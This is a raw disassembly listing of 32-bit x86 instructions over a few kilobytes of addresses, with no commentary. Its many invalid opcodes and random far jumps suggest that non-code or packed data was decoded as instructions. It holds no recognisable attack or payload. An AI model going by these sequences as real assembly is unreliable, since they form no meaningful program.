  424f49:	inc    ebp
  424f4a:	test   BYTE PTR [ecx-0x7750e800],ch
  424f50:	mov    BYTE PTR [edx],ah
  424f52:	(bad)  
  424f53:	mov    bl,0x7c
  424f55:	mov    esp,0xc600bf00
  424f5a:	sbb    bh,BYTE PTR [eax+ebp*8+0x5f]
  424f5e:	sbb    DWORD PTR [edi],0xffffffca
  424f61:	sub    edx,DWORD PTR [eax]
  424f63:	fdiv   DWORD PTR ds:0xd72c5b36
  424f69:	repnz dec edi
  424f6b:	lods   al,BYTE PTR ds:[esi]
  424f6c:	fldenv [edx-0x30]
  424f6f:	xor    dh,BYTE PTR [ebp-0x1d]
  424f72:	popa   
  424f73:	jecxz  0x424f14
  424f75:	jmp    0xb1638691
  424f7a:	sbb    DWORD PTR [eax],edi
  424f7c:	and    eax,DWORD PTR [esi+0x3dd0d0c1]
  424f82:	xor    eax,0x13
  424f85:	ds dec esp
  424f87:	xor    eax,0x7fa9d801
  424f8c:	test   DWORD PTR [edi+ebp*8-0x3f70243d],0x7e307bd0
  424f97:	sub    WORD PTR [bp+si],cx
  424f9b:	rol    DWORD PTR [edi],1
  424f9d:	mov    al,0xd3
  424f9f:	out    0x20,al
  424fa1:	jmp    0x6428:0x889d8d87
  424fa8:	jl     0x424f79
  424faa:	pushf  
  424fab:	mov    ds:0xd3516e9,eax
  424fb0:	cdq    
  424fb1:	jb     0x425010
  424fb3:	adc    edi,esi
  424fb5:	dec    ebx
  424fb6:	sub    al,0x80
  424fb8:	adc    al,al
  424fba:	mov    ah,0x77
  424fbc:	data16 idiv BYTE PTR [edx+0xc]
  424fc0:	loopne 0x425018
  424fc2:	push   ds
  424fc3:	sahf   
  424fc4:	sti    
  424fc5:	xchg   ebx,eax
  424fc6:	and    ecx,DWORD PTR [eax+0x6b1fea50]
  424fcc:	in     al,0xf0
  424fce:	lock popw ss
  424fd1:	rol    DWORD PTR [eax+edi*8-0x26004156],cl
  424fd8:	cmc    
  424fd9:	or     eax,0x2863c6cc
  424fde:	xlat   BYTE PTR ds:[ebx]
  424fdf:	mov    bh,0x10
  424fe1:	mov    ch,0x1c
  424fe3:	sbb    eax,0x444a3dea
  424fe8:	adc    ah,cl
  424fea:	int    0x62
  424fec:	mov    ch,0x5c
  424fee:	ror    BYTE PTR [edi+0x72a83b04],0x10
  424ff5:	fisttp QWORD PTR [eax+0x0]
  424ff8:	push   ebp
  424ff9:	mov    ds:0x1755e3ca,al
  424ffe:	popa   
  424fff:	fcmovnb st,st(6)
  425001:	dec    eax
  425002:	ffreep st(1)
  425004:	push   edx
  425005:	rol    edx,cl
  425007:	mov    ah,0x1d
  425009:	rol    esi,1
  42500b:	xor    dl,BYTE PTR [ebp-0x5c7e01a2]
  425011:	or     DWORD PTR [eax+edi*8],esi
  425014:	(bad)  
  425015:	fsubr  QWORD PTR [edx+0x13]
  425018:	retf   
  425019:	mov    ebp,DWORD PTR [ebp+0x3c]
  42501c:	xlat   BYTE PTR ds:[ebx]
  42501d:	hlt    
  42501e:	mov    ebx,0x5fe22b25
  425023:	test   edi,ebp
  425025:	and    eax,0xd960f491
  42502a:	or     edx,DWORD PTR [ebx]
  42502c:	std    
  42502d:	enter  0x873,0x3e
  425031:	jb     0x425065
  425033:	lea    esi,[edi-0xdb3139f]
  425039:	adc    ch,al
  42503b:	das    
  42503c:	xor    DWORD PTR [eax],edx
  42503e:	mov    ds:0x47a81ade,eax
  425043:	and    DWORD PTR [ecx],ebx
  425045:	(bad)  
  425046:	aad    0xfc
  425048:	jno    0x42507c
  42504a:	jmp    0xb55f:0x660c1e2
  425051:	xchg   edx,eax
  425052:	cmp    BYTE PTR [edi-0x40c2ba42],dh
  425058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425059:	mov    eax,ds:0x24c8fcf9
  42505e:	popa   
  42505f:	jge    0x4250a1
  425061:	xlat   BYTE PTR ds:[ebx]
  425062:	mov    ecx,0x54694554
  425067:	adc    BYTE PTR [edi+0x3b],0x6c
  42506b:	jmp    0x42505f
  42506d:	in     eax,0x11
  42506f:	xor    dh,BYTE PTR [ebx+0xa522e90]
  425075:	fld    QWORD PTR [ebp+eiz*1-0x80]
  425079:	inc    ecx
  42507a:	jmp    0x3d58ef70
  42507f:	add    ebp,ebx
  425081:	jae    0x4250f5
  425083:	ss rol bl,cl
  425086:	lahf   
  425087:	pop    ebp
  425088:	mov    ch,0x85
  42508a:	sub    ebp,DWORD PTR [esi+0x76]
  42508d:	sar    DWORD PTR [ebp-0x30],1
  425090:	rcr    edi,0x9c
  425093:	lock sti 
  425095:	inc    ebx
  425096:	mov    ch,BYTE PTR [ebx]
  425098:	push   eax
  425099:	cmp    eax,0x82165acc
  42509e:	xor    dh,BYTE PTR [edi+0x244a205]
  4250a4:	retf   0x3081
  4250a7:	cmc    
  4250a8:	sbb    al,0x29
  4250aa:	sti    
  4250ab:	xor    eax,0x11200c2f
  4250b0:	(bad)
  4250b3:	lods   eax,DWORD PTR ds:[esi]
  4250b4:	push   ds
  4250b5:	dec    ebx
  4250b6:	data16 icebp 
  4250b8:	jmp    0xe6139b7b
  4250bd:	inc    esi
  4250be:	jbe    0x42509b
  4250c0:	cwde   
  4250c1:	dec    ebp
  4250c2:	fdivr  DWORD PTR [eax+0x7e]
  4250c5:	stos   DWORD PTR es:[edi],eax
  4250c6:	mov    BYTE PTR [ebp+ebx*1-0x6aa06d2e],al
  4250cd:	dec    eax
  4250ce:	pop    edx
  4250cf:	push   0x76
  4250d1:	je     0x4250bd
  4250d3:	push   dx
  4250d5:	add    eax,0x657944f8
  4250da:	ret    0x873d
  4250dd:	mov    bh,0xbf
  4250df:	jns    0x425103
  4250e1:	lods   eax,DWORD PTR ds:[esi]
  4250e2:	and    edi,esi
  4250e4:	push   cs
  4250e5:	jae    0x42509a
  4250e7:	fidivr WORD PTR [eax+esi*4+0x19d6db09]
  4250ee:	adc    edi,DWORD PTR [edx]
  4250f0:	mov    cl,0xa2
  4250f2:	shl    BYTE PTR [eax+0x27259eb0],1
  4250f8:	pop    edi
  4250f9:	stos   BYTE PTR es:[edi],al
  4250fa:	arpl   WORD PTR [edi],dx
  4250fc:	pop    ss
  4250fd:	dec    ecx
  4250fe:	adc    eax,0xaa7bb10d
  425103:	or     BYTE PTR [eax+0x6fe8aa0a],0x4b
  42510a:	mov    ebx,0x85636f25
  42510f:	add    DWORD PTR [eax-0x48],ecx
  425112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425113:	adc    al,0x48
  425115:	adc    al,0xe2
  425117:	xchg   edi,eax
  425118:	cmp    ebp,esi
  42511a:	xchg   BYTE PTR [esi-0x65],bl
  42511d:	mov    DWORD PTR [edx+eiz*1],ebp
  425120:	or     eax,0x1a6f684d
  425125:	xrelease xchg BYTE PTR [ebp-0x7ccd1d9d],cl
  42512c:	jno    0x42517b
  42512e:	shl    DWORD PTR [edi+0x6e],cl
  425131:	out    0x5b,al
  425133:	or     esp,DWORD PTR [ecx+0x337f5699]
  425139:	in     al,0xd6
  42513b:	je     0x425150
  42513d:	retf   0x243d
  425140:	nop
  425141:	dec    eax
  425142:	sub    cl,BYTE PTR [ecx]
  425144:	cdq    
  425145:	fistp  WORD PTR [edi]
  425147:	(bad)  
  425148:	loope  0x425196
  42514a:	arpl   WORD PTR fs:[esi-0x56],bp
  42514e:	jmp    0x27a25de9
  425153:	test   BYTE PTR [edi],dh
  425155:	out    0x68,eax
  425157:	sbb    ch,BYTE PTR [ebx]
  425159:	xchg   DWORD PTR [ecx],ebx
  42515b:	mov    edx,DWORD PTR [eax]
  42515d:	mov    esp,0x8ccc1889
  425162:	inc    eax
  425163:	repz mov ch,0x89
  425166:	add    ah,dl
  425168:	cdq    
  425169:	push   ecx
  42516a:	push   eax
  42516b:	pop    ebp
  42516c:	fadd   QWORD PTR [eax+0x5dfc226f]
  425172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425173:	xor    al,0xf9
  425175:	(bad)  
  425176:	loopne 0x4251a0
  425178:	(bad)  
  42517a:	add    al,0xc7
  42517c:	pop    ebx
  42517d:	or     DWORD PTR [ecx+ebp*1],esp
  425180:	adc    BYTE PTR [esi+0x38],ah
  425183:	shl    DWORD PTR [edx-0x5d],1
  425186:	stos   BYTE PTR es:[edi],al
  425187:	mov    ebx,0x5eab4f9
  42518c:	ret    0x577e
  42518f:	jae    0x42515f
  425191:	push   ss
  425192:	idiv   DWORD PTR [ebx]
  425194:	pushf  
  425195:	enter  0xed23,0x54
  425199:	xchg   ecx,eax
  42519a:	jne    0x4251c5
  42519c:	sub    BYTE PTR [eax-0x60],bh
  42519f:	push   esp
  4251a0:	mov    bh,ch
  4251a2:	or     bl,BYTE PTR [ecx]
  4251a4:	add    BYTE PTR ds:0x4f97dd66,dh
  4251aa:	and    eax,0xa250510e
  4251af:	fisttp WORD PTR [ebx-0x129d5ae0]
  4251b5:	mov    DWORD PTR [edi+edi*8],ebp
  4251b8:	icebp  
  4251b9:	dec    ebp
  4251ba:	jns    0x4251f0
  4251bc:	das    
  4251bd:	push   esp
  4251be:	xor    ebp,edi
  4251c0:	push   edx
  4251c1:	sbb    eax,0x325c548f
  4251c6:	push   es
  4251c7:	ins    BYTE PTR es:[edi],dx
  4251c8:	xchg   eax,ecx
  4251ca:	dec    edx
  4251cb:	sbb    BYTE PTR [eax-0x75b7773c],0xb4
  4251d2:	sbb    ecx,esp
  4251d4:	sub    edi,esp
  4251d6:	lds    eax,FWORD PTR [edi+eax*2+0x5d]
  4251da:	arpl   bp,di
  4251dc:	dec    esp
  4251dd:	cmc    
  4251de:	inc    eax
  4251df:	or     al,0xa2
  4251e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251e2:	jmp    0x4251ba
  4251e4:	dec    esp
  4251e5:	and    eax,0xe2933456
  4251ea:	inc    ebp
  4251eb:	daa    
  4251ec:	mov    BYTE PTR [edx],0x58
  4251ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f0:	retf   0xcd5c
  4251f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f4:	lock pop ds
  4251f6:	in     eax,dx
  4251f7:	add    al,0xc6
  4251f9:	xchg   ebp,eax
  4251fa:	stos   BYTE PTR es:[edi],al
  4251fb:	jecxz  0x425237
  4251fd:	or     BYTE PTR [eax],dl
  4251ff:	(bad)  [esi-0x7162f82b]
  425205:	ret    
  425206:	adc    DWORD PTR [eax],0x8b4f7ca5
  42520c:	(bad)  
  42520d:	lds    eax,FWORD PTR [eax]
  42520f:	sub    al,BYTE PTR [esp+ecx*1-0x6a]
  425213:	cmp    dh,bl
  425215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425216:	pop    ds
  425217:	aad    0xf1
  425219:	inc    eax
  42521a:	test   DWORD PTR [ebx+ebp*4+0x30],edi
  42521e:	bound  eax,QWORD PTR [ebp-0x45eba5da]
  425224:	inc    ecx
  425225:	mov    ebp,DWORD PTR [edx]
  425227:	or     DWORD PTR [edx],0x4d0677c3
  42522d:	outs   dx,BYTE PTR ds:[esi]
  42522e:	ds jne 0x4252a4
  425231:	adc    eax,0xd1b60f87
  425236:	cmp    eax,0x5fc3e2e3
  42523b:	fstp   st(1)
  42523d:	push   ds
  42523e:	into   
  42523f:	lods   al,BYTE PTR ds:[esi]
  425240:	mov    esp,DWORD PTR [eax]
  425242:	and    DWORD PTR ss:[ebx],esi
  425245:	loop   0x42529e
  425247:	call   FWORD PTR ds:0x310054f6
  42524d:	add    BYTE PTR [edx-0x64],cl
  425250:	mov    edx,0xb091ff54
  425255:	dec    esi
  425256:	push   ebp
  425257:	dec    eax
  425258:	repz dec eax
  42525a:	and    al,BYTE PTR [edx-0x167bc559]
  425260:	xor    esi,DWORD PTR [ebx-0x715a8f08]
  425266:	ret    
  425267:	stc    
  425268:	mov    WORD PTR [esi-0x1e],gs
  42526b:	mov    eax,ds:0x2914fcba
  425270:	lods   eax,DWORD PTR ds:[esi]
  425271:	push   ebp
  425272:	mov    ebp,DWORD PTR [esi]
  425274:	call   0x91a63cc6
  425279:	adc    edx,DWORD PTR [eax-0x27]
  42527c:	jns    0x425228
  42527e:	dec    ebx
  42527f:	mov    ebp,DWORD PTR [edx+0x52269376]
  425285:	call   0xe53853fd
  42528a:	xchg   ebx,eax
  42528b:	fdiv   DWORD PTR [edi]
  42528d:	sahf   
  42528e:	rcr    BYTE PTR [ebp-0x2c],0xef
  425292:	scas   al,BYTE PTR es:[edi]
  425293:	pop    esp
  425294:	fcmovb st,st(4)
  425296:	ja     0x425253
  425298:	xor    edx,ebp
  42529a:	cmp    al,BYTE PTR [ecx]
  42529c:	(bad)  
  42529e:	and    eax,DWORD PTR [edx+0x48]
  4252a1:	mov    edx,0x4421b928
  4252a6:	test   al,0xf8
  4252a8:	xchg   edi,eax
  4252a9:	jmp    0x4252a8
  4252ab:	sbb    DWORD PTR [ebx],0x71dfdfa3
  4252b1:	inc    eax
  4252b2:	sti    
  4252b3:	lock or esp,DWORD PTR [ecx]
  4252b6:	test   al,0x89
  4252b8:	mov    ah,BYTE PTR [edi]
  4252ba:	inc    eax
  4252bb:	mov    ah,BYTE PTR [ecx]
  4252bd:	or     al,0x17
  4252bf:	push   esp
  4252c0:	adc    al,0x63
  4252c2:	sahf   
  4252c3:	dec    eax
  4252c4:	inc    ecx
  4252c5:	loope  0x4252a9
  4252c7:	jb     0x4252c9
  4252c9:	xchg   BYTE PTR [ebx],cl
  4252cb:	inc    ebx
  4252cc:	or     BYTE PTR [ecx-0x37],dh
  4252cf:	imul   edx,DWORD PTR [ebx-0x29],0x15
  4252d3:	mov    ch,0x40
  4252d5:	sub    al,0xf6
  4252d7:	inc    ax
  4252d9:	mov    WORD PTR [eax],?
  4252db:	adc    BYTE PTR [ecx],ah
  4252dd:	ds or  ebx,0x13626842
  4252e4:	adc    dl,al
  4252e6:	ss and eax,0x8c3d10ac
  4252ec:	add    ecx,DWORD PTR [ecx]
  4252ee:	jecxz  0x4252ea
  4252f0:	scas   al,BYTE PTR es:[edi]
  4252f1:	icebp  
  4252f2:	cdq    
  4252f3:	cdq    
  4252f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252f5:	and    eax,DWORD PTR [edi+edi*4-0x3214553d]
  4252fc:	outs   dx,DWORD PTR ds:[esi]
  4252fd:	mov    eax,0x46399814
  425302:	push   ecx
  425303:	inc    edi
  425304:	inc    esp
  425305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425306:	or     DWORD PTR [ecx-0x59],esp
  425309:	sub    dl,ah
  42530b:	xor    dl,dh
  42530d:	int3   
  42530e:	xor    bh,BYTE PTR [esi]
  425310:	outs   dx,DWORD PTR ds:[esi]
  425311:	shl    BYTE PTR [edi],0x8c
  425314:	call   0x102f:0x15294bc6
  42531b:	js     0x42532f
  42531d:	mov    esi,0x5daaf011
  425322:	and    al,0xd8
  425324:	inc    ebx
  425325:	mov    bl,0xf8
  425327:	popf   
  425328:	xchg   edi,eax
  425329:	push   0x3c
  42532b:	mov    ah,0xaa
  42532d:	push   eax
  42532e:	in     al,dx
  42532f:	sub    BYTE PTR [esi+0x33],al
  425332:	pop    ecx
  425333:	cmp    BYTE PTR ds:0x115ae042,bh
  425339:	mov    ds:0x66d50d56,eax
  42533e:	adc    DWORD PTR [edx+0x42558c3d],0xffffff80
  425345:	std    
  425346:	inc    ecx
  425347:	xor    bh,ch
  425349:	dec    esp
  42534a:	add    bh,BYTE PTR [ebp-0xbd0fcae]
  425350:	push   es
  425351:	cmp    esp,DWORD PTR [ebx+0xa52ba92]
  425357:	or     esp,esi
  425359:	push   esp
  42535a:	adc    ebx,DWORD PTR [eax]
  42535c:	xchg   ebp,eax
  42535d:	es out dx,al
  42535f:	bound  ebx,QWORD PTR [edx+edx*2-0x15722c5a]
  425366:	icebp  
  425367:	push   esp
  425368:	js     0x425318
  42536a:	ds jbe 0x4253c4
  42536d:	xchg   BYTE PTR [edx+0xbfb0bb6],bh
  425373:	pop    ebx
  425374:	clc    
  425375:	je     0x42531a
  425377:	scas   eax,DWORD PTR es:[edi]
  425378:	stos   DWORD PTR es:[edi],eax
  425379:	aaa    
  42537a:	mov    ecx,DWORD PTR [edx]
  42537c:	and    BYTE PTR [edi-0x3c],ah
  42537f:	add    BYTE PTR fs:[ebp+0x1ec839a1],bh
  425386:	or     al,0x7b
  425388:	inc    edi
  425389:	dec    esp
  42538a:	push   es
  42538b:	sub    ecx,DWORD PTR [edi+ebx*2]
  42538e:	nop
  42538f:	cwde   
  425390:	js     0x4253f9
  425392:	les    esi,FWORD PTR [ebx]
  425394:	nop
  425395:	imul   eax
  425397:	gs (bad) 
  425399:	jnp    0x42538a
  42539b:	aam    0xae
  42539d:	or     al,0x6a
  42539f:	or     DWORD PTR [eax],0xaf1b2162
  4253a5:	jmp    0xc9f7:0x90cf0b7
  4253ac:	jb     0x4253c5
  4253ae:	jnp    0x425359
  4253b0:	(bad)  
  4253b1:	sub    al,0x72
  4253b3:	sub    eax,0xd56a24ca
  4253b8:	shr    DWORD PTR [eax],0x4e
  4253bb:	xor    eax,0x521222c6
  4253c0:	cmp    eax,0xd79ce328
  4253c5:	push   esi
  4253c6:	mov    cl,0x8a
  4253c8:	dec    edx
  4253c9:	addr16 push eax
  4253cb:	ds pop esp
  4253cd:	mov    ebx,0xd888f8fd
  4253d2:	stos   BYTE PTR es:[edi],al
  4253d3:	iret   
  4253d4:	pusha  
  4253d5:	sbb    ebx,DWORD PTR [edi-0x36072434]
  4253db:	push   edx
  4253dc:	pop    eax
  4253dd:	aaa    
  4253de:	xor    cl,BYTE PTR [ebp-0x7a]
  4253e1:	ret    0xd0f8
  4253e4:	push   ebp
  4253e5:	jne    0x4253a3
  4253e7:	repnz cli 
  4253e9:	push   es
  4253ea:	inc    edx
  4253eb:	pop    esp
  4253ec:	mov    ds:0x87b1ff87,eax
  4253f1:	iret   
  4253f2:	mov    bh,0x7
  4253f4:	ret    0xc151
  4253f7:	jg     0x42542a
  4253f9:	add    cl,BYTE PTR [edx+0x39]
  4253fc:	cmp    esi,DWORD PTR [ebx]
  4253fe:	add    al,0xfe
  425400:	jnp    0x42546e
  425402:	add    BYTE PTR [edx],dh
  425404:	cmp    ecx,esi
  425406:	inc    ebx
  425407:	fwait
  425408:	in     eax,0x9d
  42540a:	test   BYTE PTR [ecx],al
  42540c:	pop    esp
  42540d:	dec    edi
  42540e:	push   es
  42540f:	mov    al,0xc1
  425411:	dec    ebp
  425412:	cli    
  425413:	call   0x529088f0
  425418:	pop    ds
  425419:	lahf   
  42541a:	and    BYTE PTR [edi+esi*4-0x23],ch
  42541e:	xchg   esi,eax
  42541f:	out    dx,al
  425420:	pushf  
  425421:	xchg   ebx,eax
  425422:	in     al,dx
  425423:	aaa    
  425424:	mov    cl,0xd2
  425426:	call   0xbd77a98d
  42542b:	in     al,dx
  42542c:	inc    ecx
  42542d:	xlat   BYTE PTR ds:[ebx]
  42542e:	dec    ecx
  42542f:	push   ebx
  425430:	pop    ss
  425431:	sbb    eax,0xc8605dd3
  425436:	adc    al,0xc8
  425438:	fdecstp 
  42543a:	mov    BYTE PTR [edx],0x84
  42543d:	jae    0x425450
  42543f:	stos   BYTE PTR es:[edi],al
  425440:	adc    dl,BYTE PTR [esi]
  425442:	out    dx,al
  425443:	test   eax,0xeeb1f095
  425448:	cmp    BYTE PTR [esi+0x3d073616],cl
  42544e:	clc    
  42544f:	mov    BYTE PTR [eax],cl
  425451:	xchg   bx,ax
  425453:	jge    0x4253f2
  425455:	fwait
  425456:	sbb    al,0xa0
  425458:	dec    edx
  425459:	mov    cl,0xb1
  42545b:	aad    0xd7
  42545d:	fsub   DWORD PTR [edi+eiz*2+0x2bc5426c]
  425464:	and    esp,DWORD PTR [esi-0x1b6545c8]
  42546a:	xor    edx,esi
  42546c:	add    BYTE PTR [esi-0x1d53f7b8],bh
  425472:	je     0x4254c9
  425474:	in     al,dx
  425475:	int3   
  425476:	out    0x13,al
  425478:	mov    ds:0x61202091,al
  42547d:	add    BYTE PTR [edx+0x1dc427d5],dl
  425483:	xor    al,0xde
  425485:	xor    ecx,DWORD PTR [ecx]
  425487:	push   ebx
  425488:	ret    0xcd64
  42548b:	in     al,0x1f
  42548d:	ror    DWORD PTR [edx+0xcc28c2e],cl
  425493:	adc    dh,BYTE PTR [edx]
  425495:	jne    0x425514
  425497:	adc    esi,DWORD PTR [esi-0xae7f965]
  42549d:	popf   
  42549e:	add    al,0x76
  4254a0:	jmp    0x4871:0xcd5122eb
  4254a7:	mov    al,ds:0x6ac38c0e
  4254ac:	mov    edx,0xdf7fcd24
  4254b1:	dec    edi
  4254b2:	mov    ch,0x90
  4254b4:	int    0x56
  4254b6:	jae    0x425461
  4254b8:	ret    
  4254b9:	dec    edi
  4254ba:	fist   WORD PTR [ebp+0x32331f5]
  4254c0:	gs mov esp,0x6048aaa2
  4254c6:	mov    WORD PTR [eax],ss
  4254c8:	test   BYTE PTR [eax],ah
  4254ca:	and    esi,DWORD PTR [ebx+0x1e]
  4254cd:	adc    dl,dl
  4254cf:	sub    al,0x61
  4254d1:	int3   
  4254d2:	mov    ds:0xfa006df0,eax
  4254d7:	int3   
  4254d8:	pop    esp
  4254d9:	adc    eax,edx
  4254db:	push   edx
  4254dc:	cmp    eax,0xc7a25580
  4254e1:	sti    
  4254e2:	sub    al,BYTE PTR [ecx]
  4254e4:	and    al,0x55
  4254e6:	int    0x86
  4254e8:	call   0x1f7f0d0b
  4254ed:	xchg   ebp,eax
  4254ee:	shl    BYTE PTR [esi],cl
  4254f0:	inc    esi
  4254f1:	frstor [edx]
  4254f3:	sbb    al,BYTE PTR [esi+esi*8+0x3d8c3a6e]
  4254fa:	test   eax,0x5852f628
  4254ff:	in     al,0x23
  425501:	push   ss
  425502:	mov    esi,0xf7241fd4
  425507:	aam    0x79
  425509:	sahf   
  42550a:	out    dx,al
  42550b:	cdq    
  42550c:	mov    edx,fs
  42550e:	mov    DWORD PTR [edx+0x57],esp
  425511:	aaa    
  425512:	xchg   DWORD PTR [ebp-0x2cb1310d],ecx
  425518:	rcl    DWORD PTR [ebp+0x72],1
  42551b:	dec    eax
  42551c:	out    0xba,al
  42551e:	aam    0xbc
  425520:	dec    edx
  425521:	paddd  mm1,mm5
  425524:	sbb    edx,DWORD PTR [ebx]
  425526:	cwde   
  425527:	dec    esp
  425528:	hlt    
  425529:	xor    cl,bh
  42552b:	in     eax,dx
  42552c:	add    bh,dh
  42552e:	mov    dl,0xdc
  425530:	(bad)  
  425531:	dec    esp
  425532:	iret   
  425533:	add    BYTE PTR [bp+di],cl
  425536:	push   es
  425537:	inc    ecx
  425538:	cwde   
  425539:	pop    ebp
  42553a:	jbe    0x4254bc
  42553c:	popf   
  42553d:	sub    ah,BYTE PTR [edx+0x37544ff9]
  425543:	cmc    
  425544:	mov    ecx,0x3fcaee84
  425549:	fst    DWORD PTR [edi]
  42554b:	xor    ecx,DWORD PTR [edi]
  42554d:	inc    edx
  42554e:	add    al,BYTE PTR [esp+eiz*4-0x2857198]
  425555:	loop   0x4255ab
  425557:	adc    dl,BYTE PTR [edi+0x357e20ad]
  42555d:	xlat   BYTE PTR ds:[ebx]
  42555e:	ret    
  42555f:	or     eax,DWORD PTR [ebp+esi*1-0x39]
  425563:	retf   0xac6d
  425566:	push   ebp
  425567:	mov    ebx,0xb4215b68
  42556c:	push   esp
  42556d:	pop    eax
  42556e:	das    
  42556f:	xchg   ebp,eax
  425570:	out    dx,eax
  425571:	nop
  425572:	out    dx,al
  425573:	sbb    eax,0xef9d46d0
  425578:	test   eax,0xa0d9b406
  42557d:	mov    ecx,DWORD PTR [ebx+0x222e86e5]
  425583:	push   edx
  425584:	imul   edi,DWORD PTR [ebx+0x584246c8],0x6f
  42558b:	mov    ah,0x90
  42558d:	and    ch,ch
  42558f:	int    0xf1
  425591:	mov    al,0x3f
  425593:	push   eax
  425594:	sub    ebx,esp
  425596:	xchg   esi,eax
  425597:	in     al,0x24
  425599:	pop    edx
  42559a:	out    dx,al
  42559b:	sbb    BYTE PTR [edi+edi*8-0x48faa086],0xdd
  4255a3:	fcmovnb st,st(4)
  4255a5:	addr16 (bad) 
  4255a8:	jmp    0xccd:0x7ce617fa
  4255af:	fsub   st,st(1)
  4255b1:	xor    al,0x68
  4255b3:	cmp    DWORD PTR [ebx+0x3e4008db],esi
  4255b9:	nop
  4255ba:	xor    al,0x55
  4255bc:	popa   
  4255bd:	add    BYTE PTR [esi-0x39],ah
  4255c0:	xlat   BYTE PTR ds:[ebx]
  4255c1:	jnp    0x42556c
  4255c3:	mov    ebx,0x6fcc4975
  4255c8:	mov    DWORD PTR [ebp-0x50],esp
  4255cb:	dec    ecx
  4255cc:	mov    eax,0x9a6016af
  4255d1:	cmp    cl,ah
  4255d3:	mov    esi,0xa9e71474
  4255d8:	mov    bl,0x17
  4255da:	pop    edx
  4255db:	push   cs
  4255dc:	and    DWORD PTR [edi+ecx*2-0x69],ecx
  4255e0:	mov    bh,0x9a
  4255e2:	(bad)  
  4255e3:	fcmovnu st,st(2)
  4255e5:	lds    esi,FWORD PTR [ecx-0x4a29eec5]
  4255eb:	rcl    BYTE PTR [ebp+0x1],cl
  4255ee:	inc    ebp
  4255ef:	adc    eax,0x7efefbd2
  4255f4:	add    ebx,edi
  4255f6:	mov    al,0xf2
  4255f8:	clc    
  4255f9:	sbb    bl,BYTE PTR [ecx+0x4d]
  4255fc:	es push ss
  4255fe:	inc    ecx
  4255ff:	sbb    BYTE PTR [ebp+ebp*2+0x1fbaf52f],0xdc
  425607:	rol    DWORD PTR [edi-0xf],cl
  42560a:	fcomp  DWORD PTR [edx]
  42560c:	xor    cl,BYTE PTR [ebp+0x1b49520e]
  425612:	jbe    0x4255cd
  425614:	test   BYTE PTR [eax-0x39],dh
  425617:	inc    edx
  425618:	dec    ebp
  425619:	xor    DWORD PTR [ebx],edx
  42561b:	dec    ebx
  42561c:	jmp    0x99ff329f
  425621:	sbb    ah,ch
  425623:	add    BYTE PTR [ebx+0x64],0x11
  425627:	shl    DWORD PTR [ebp-0x4],cl
  42562a:	aas    
  42562b:	push   ecx
  42562c:	imul   ebp,DWORD PTR [edx-0x68],0x241fc523
  425633:	push   es
  425634:	pop    esi
  425635:	and    al,0xac
  425637:	jo     0x4256b3
  425639:	xchg   ecx,eax
  42563a:	les    esp,FWORD PTR [edx-0x18]
  42563d:	adc    DWORD PTR [edx-0x3df81e4e],eax
  425643:	add    BYTE PTR [esi-0x64e5af2f],bh
  425649:	cwde   
  42564a:	jle    0x4256cb
  42564c:	xchg   ebx,eax
  42564d:	call   0x91023f1f
  425652:	icebp  
  425653:	sbb    eax,0x99b6e13
  425658:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42565a:	sbb    ah,BYTE PTR [eax]
  42565c:	push   es
  42565d:	es push ebx
  42565f:	push   edi
  425660:	pop    ss
  425661:	test   BYTE PTR [eax],dl
  425663:	ss (bad) 
  425665:	ins    WORD PTR es:[di],dx
  425668:	leave  
  425669:	mov    BYTE PTR ds:0x1e98b18d,0xa
  425670:	rol    DWORD PTR [esi],cl
  425672:	popa   
  425673:	(bad)  
  425674:	dec    bl
  425676:	sbb    al,0xcc
  425678:	pusha  
  425679:	and    al,0x79
  42567b:	ins    DWORD PTR es:[edi],dx
  42567c:	sbb    bh,bh
  42567e:	pop    esp
  42567f:	jecxz  0x4256ff
  425681:	xor    al,BYTE PTR [esi]
  425683:	icebp  
  425684:	or     dh,ch
  425686:	mov    cl,0x13
  425688:	rcr    DWORD PTR [eax-0x2532ff0b],0x11
  42568f:	adc    bh,BYTE PTR [ecx-0x227f89d8]
  425695:	sbb    BYTE PTR [esi+ecx*4-0x5fc7b421],al
  42569c:	pop    edx
  42569d:	jp     0x42563c
  42569f:	or     dl,bl
  4256a1:	clc    
  4256a2:	add    BYTE PTR [edi-0x715e8988],ch
  4256a8:	loopne 0x42567e
  4256aa:	jle    0x425710
  4256ac:	add    ebp,DWORD PTR [esi]
  4256ae:	push   esi
  4256af:	stos   DWORD PTR es:[edi],eax
  4256b0:	jmp    0x42563a
  4256b2:	push   edi
  4256b3:	jmp    0x4256ed
  4256b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256b6:	dec    edx
  4256b7:	mov    bh,0x4f
  4256b9:	fistp  DWORD PTR [eax]
  4256bb:	out    0x29,eax
  4256bd:	ins    DWORD PTR es:[edi],dx
  4256be:	adc    dl,dh
  4256c0:	pop    edi
  4256c1:	or     al,BYTE PTR [ecx+esi*2]
  4256c4:	mov    dh,0xd5
  4256c6:	shl    DWORD PTR [ebp-0x50a32b2e],cl
  4256cc:	sbb    DWORD PTR [ebp-0x1d1e4aa0],ecx
  4256d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256d3:	jb     0x4256dc
  4256d5:	jnp    0x4256ff
  4256d7:	inc    esp
  4256d8:	(bad)  
  4256d9:	mov    al,BYTE PTR [edi+eax*8+0x2a64fdfc]
  4256e0:	mov    ds,ecx
  4256e2:	test   al,0x8d
  4256e4:	cs add eax,0x448e7bcf
  4256ea:	adc    DWORD PTR [edx],esp
  4256ec:	repz mov eax,0xff1942fe
  4256f2:	mov    ah,0xd2
  4256f4:	shr    DWORD PTR [esi],cl
  4256f6:	cmp    BYTE PTR [ebp+0x4c5b8802],ah
  4256fc:	loop   0x425742
  4256fe:	add    al,0x1
  425700:	cwde   
  425701:	stc    
  425702:	push   cs
  425703:	and    DWORD PTR [edi-0xcbcfdc0],ecx
  425709:	pop    ss
  42570a:	cwde   
  42570b:	das    
  42570c:	enter  0x420,0xdf
